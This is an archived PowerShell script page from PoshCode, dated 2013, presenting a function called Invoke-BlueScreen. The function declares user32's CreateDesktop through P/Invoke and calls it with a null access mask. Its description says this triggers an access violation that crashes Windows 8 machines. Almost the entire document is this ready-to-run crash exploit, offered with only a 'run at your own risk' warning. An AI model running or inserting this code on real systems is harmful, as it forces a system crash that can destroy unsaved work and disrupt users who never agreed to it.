---
Author: adamdriscoll
Publisher: 
Copyright: 
Email: 
Version: 0.1
Encoding: ascii
License: cc0
PoshCode ID: 4216
Published Date: 2013-06-24t00
Archived Date: 2016-12-06t10
---

# invoke-bluescreen - 

## Description

causes a blue screen on windows 8 machines. run at your own risk!! the reason is due to an access violation caused by passing in a null value to the access mask of the createdesktop function.

## Comments



## Usage



## TODO



## function

`invoke-bluescreen`

## Code

`#
 #
 function Invoke-BlueScreen
 {
     Add-Type "
       using System;
       using System.Runtime.InteropServices;
       public class PInvoke
       {
           [DllImport(`"user32.dll`")]
           public static extern IntPtr CreateDesktop(string desktopName, IntPtr device, IntPtr deviceMode, int flags, long accessMask, IntPtr attributes);
       }
     "
 
     [PInvoke]::CreateDesktop("BSOD", [IntPtr]::Zero, [IntPtr]::Zero, 0, $null, [IntPtr]::Zero)
 }
`

